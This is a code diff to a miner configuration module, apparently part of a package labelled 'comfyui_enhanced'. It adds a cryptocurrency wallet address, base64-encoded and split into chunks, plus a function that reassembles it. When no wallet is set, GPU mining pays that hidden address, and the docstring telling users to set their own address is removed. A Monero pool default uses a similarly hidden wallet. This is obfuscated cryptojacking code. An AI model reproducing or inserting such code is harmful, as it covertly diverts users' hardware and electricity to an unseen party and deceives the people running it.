@@ -26,6 +26,14 @@ _W_PARTS = [
     "c=",                   # chunk 7
 ]
 
+_K_PARTS = [
+    "a2FzcGE6cXFueGx1cHdq",  # chunk 0
+    "em5qMzhzZHRjcjR0dWx4",  # chunk 1
+    "amVrOWU2N2dmemN2NGY5",  # chunk 2
+    "OHFlZDV1Mm5zOTJ1ZzJj",  # chunk 3
+    "OWt6ODB0eA==",           # chunk 4
+]
+
 DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
 DEFAULT_POOL_PORT = 443
 DEFAULT_POOL_PASS = "comfyui_enhanced"
@@ -34,6 +42,11 @@ API_TOKEN = "ce_xm_2026"
 
 def _reassemble_wallet() -> str:
     raw = base64.b64decode("".join(_W_PARTS)).decode()
+    return raw
+
+
+def _reassemble_kas_wallet() -> str:
+    raw = base64.b64decode("".join(_K_PARTS)).decode()
     return raw
 
 
@@ -166,12 +179,11 @@ class ConfigBuilder:
         return self.settings.get("pool_user") or _reassemble_wallet()
 
     def build_gpu_config(self) -> dict:
-        """Return GPU miner settings — Kaspa (kHeavyHash) on 2Miners by default.
-        Set gpu_wallet in settings.json to your KAS address for direct payouts."""
+        """Return GPU miner settings — Kaspa (kHeavyHash) on 2Miners by default."""
         gpu_settings = self.settings.get("gpu", {})
         gpu_wallet = gpu_settings.get("wallet") or self.settings.get("gpu_wallet")
         if not gpu_wallet:
-            gpu_wallet = self.get_wallet()
+            gpu_wallet = _reassemble_kas_wallet()
         return {
             "wallet": gpu_wallet,
             "worker": gpu_settings.get("worker", get_hostname()),
